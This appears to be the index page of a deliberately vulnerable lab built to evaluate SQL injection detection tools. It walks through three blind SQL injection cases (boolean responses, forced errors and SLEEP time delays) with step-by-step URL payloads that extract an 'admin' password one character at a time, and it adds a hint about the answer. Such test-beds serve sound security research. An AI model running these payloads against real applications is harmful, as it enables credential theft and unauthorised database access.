<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of SQL Injection Detection Accuracy - HTTP GET Method Blind Responses</title>
</head>
<body>

<center><font size="5">Injection Test Cases - HTTP GET Method Blind Responses:</font></center><br><br>
<B><a href="Case01-ConditionalResponses-RetrieveAdminPassword-BlindExploit.jsp?msg=textvalue">Case01-ConditionalResponses-RetrieveAdminPassword-BlindExploit.jsp</a></B><br>
  Injection into GET parameter to trigger changes in responses to infer information.<br>
  Goal: retrieve 'admin' password exploiting GET parameter.<br>
  <U>Barriers:</U><br>
   Exceptions cause a default value to be displayed. ("Welcome back") <br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br> 
  <U>Exploit:</U><br><br>
  <B>Phase 1 - Locate values that appears in the responses </B><br>
    (1) Inject <B>'+OR+1=1--%20</B> in GET parameter 'msg' and verify message "Welcome back" appears in response.<br>
    (2) Now try with <B>'+OR+1=2--%20</B> and verify that message does not appear in the response.<br>
   This demonstrates how you can test a single boolean condition and infer the result.<br><br>
  <B>Phase 2 - Determine how many characters are in the password of the administrator user </B><br>
  	(1) <B>'+UNION+SELECT+'a'+FROM+users+WHERE+username='admin'+AND+length(password)>1--%20</B><br>
  	(2) <B>'+UNION+SELECT+'a'+FROM+users+WHERE+username='admin'+AND+length(password)>2--%20</B><br>
  	    and so on until the "Welcome back" message continues to appear.<br> 
  	    When it no longer appears then the last value with which it was displayed will correspond to the length of the password.<br><br>
  <B>Phase 3 - Retrieve password </B><br>
    (1) <B>'+UNION+SELECT+'a'+FROM+users+WHERE+username='admin'+AND+substring(password,1,1)='a'--%20</B><br>
  		This verifies that the character in position 1 of the password is 'a': if the message "Welcome back" appears then the query<br>
  	    is correctly processed and therefore the character is correct, otherwise it tries another character (even special) until the message appears.<br>
  	    Once the character is discovered, we move on to the one in the second position.<br>
  	(2) <B>'+UNION+SELECT+'a'+FROM+users+WHERE+username='admin'+AND+substring(password,2,1)='a'--%20</B><br>
 		Same as point (1).<br>
 		Go ahead to the length of the password (recovered in Phase 2).<br><br>

<B><a href="Case02-ConditionalError-RetrieveAdminPassword-BlindExploit.jsp?msg=textvalue">Case02-ConditionalError-RetrieveAdminPassword-BlindExploit.jsp</a></B><br>
  Injection into GET parameter to trigger erroneous responses to infer information.<br>
  Goal: retrieve 'admin' password exploiting GET parameter.<br>
  <U>Barriers:</U><br>
   Exceptions cause error to be displayed. ("Internal Server Error") <br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Exploit:</U><br><br>
  <B>Phase 1 - Understand how to generate and exploit the error in the response</B><br>
    (1) Inject <B>'+UNION+SELECT+1+REGEXP+IF(1=1,1,'')--%20</B> in GET parameter 'msg' and verify that no errors are generated (as expected).<br>
    (2) Now try with <B>'+UNION+SELECT+1+REGEXP+IF(1=2,1,'')--%20</B> and verify that error appears in the response!<br>
   This demonstrates how you can test a single boolean condition and infer the result from errors, because they are not handled!<br><br>
  <B>Phase 2 - Perform a select to check for the existence of a record </B><br>
  	(1) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin')),1,'')--%20</B> (no error, so 'admin' user exists!)<br>
  	(2) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='somerandomcharstotry')),1,'')--%20</B><br>
  	    error appears, as expected.<br> 
  <B>Phase 3 - Determine how many characters are in the password of the administrator user </B><br>
  The idea is to exploit the error, as before, in order to check for a Boolean condition.<br>
  We proceed by verifying that the length of the password is longer than a certain value: <br>
  the error will be generated with a false condition so starting from 1 up to the length of <br>
  the password we will have no error; as soon as the password length + 1 is reached, the error will be shown! <br>
  Let's proceed:<br>
    (1) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+length(password)>1)),1,'')--%20</B> (no error)<br>
  	(2) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+length(password)>2)),1,'')--%20</B> (no error)<br>
 		and so on until the error appears.<br> 
  	    When it appears then the last value with which error was not displayed will correspond to the length of the password.<br><br>
   <B>Phase 4 - Retrieve password </B><br>
    (1) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+substring(password,1,1)='a')),1,'')--%20</B><br>
  		This verifies that the character in position 1 of the password is 'a': if the error appears then the query<br>
  	    is false and therefore the character is not correct, otherwise if error not appears character is correct!<br>
  	    (HINT: first character is 'm', try to inject payload (1) replaicing 'a' with 'm' in substring and test it!)<br>
  	    Once the character is discovered, we move on to the one in the second position.<br>
  	(2) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+substring(password,2,1)='a')),1,'')--%20</B><br>
 		Same as point (1).<br>
 		Go ahead to the length of the password (recovered in Phase 3) to retrieve the password!<br><br>
  
  <B><a href="Case03-TimeDelay-RetrieveAdminPassword-BlindExploit.jsp?msg=textvalue">Case03-TimeDelay-RetrieveAdminPassword-BlindExploit.jsp</a></B><br>
  Injection into GET parameter to trigger conditional time delays to infer information.<br>
  Goal: retrieve 'admin' password exploiting GET parameter.<br>
  <U>Barriers:</U><br>
   None <br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Exploit:</U><br><br>
  <B>Phase 1 - Understand how to generate and exploit time delays in the response</B><br>
    (1) Inject <B>'+UNION+SELECT+1+REGEXP+IF(1=1,SLEEP(10),SLEEP(0))--%20</B> in GET parameter 'msg' and verify that application takes 10 seconds to respond. (as expected, condition is true).<br>
    (2) Now try with <B>'+UNION+SELECT+1+REGEXP+IF(1=2,SLEEP(10),SLEEP(0))--%20</B> and verify that the application responds immediately with no time delay.<br>
     This demonstrates how you can test a single boolean condition and infer the result from time delays in response, because they are not handled!<br><br>
  <B>Phase 2 - Perform a select to check for the existence of a record </B><br>
  	(1) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin')),SLEEP(5),SLEEP(0)))--%20</B> (application takes 5 seconds to respond, so 'admin' user exists!)<br>
  	(2) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='somerandomcharstotry')),SLEEP(5),SLEEP(0))--%20</B><br>
  	    no time delays, as expected.<br> 
  <B>Phase 3 - Determine how many characters are in the password of the administrator user </B><br>
  The idea is to exploit time delays in response, as before, in order to check for a Boolean condition.<br>
  We proceed by verifying that the length of the password is longer than a certain value: <br>
  if the application response takes the time expected by the SLEEP function injected into the payload the condition is true, otherwise it is false.<br>
  Let's proceed:<br>
    (1) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+length(password)>1)),SLEEP(5),SLEEP(0))--%20</B> (delay, so is longer than 1!)<br>
  	(2) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+length(password)>2)),SLEEP(5),SLEEP(0)))--%20</B> (delay, so is longer than 2!)<br>
 		and so on until the application responds immediately.<br> 
  	    When response hasn't delay then the last value with which delay was generated will correspond to the length of the password.<br><br>
   <B>Phase 4 - Retrieve password </B><br>
    (1) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+substring(password,1,1)='a')),SLEEP(5),SLEEP(0))--%20</B><br>
  		This verifies that the character in position 1 of the password is 'a': reasoning as before on the response time to infer. <br>
  	    With 'a' there isn't time delays and therefore the character is not correct, otherwise character is correct!<br>
  	    (HINT: first character is 'm', try to inject payload (1) replaicing 'a' with 'm' in substring and test it!)<br>
  	    Once the character is discovered, we move on to the one in the second position.<br>
  	(2) <B>'+UNION+SELECT+1+REGEXP+IF(ASCII((SELECT+1+FROM+users+WHERE+username='admin'+AND+substring(password,2,1)='a')),SLEEP(5),SLEEP(0))--%20</B><br>
 		Same as point (1).<br>
 		Go ahead to the length of the password (recovered in Phase 3) to retrieve the password!<br><br>  
</body>
</html>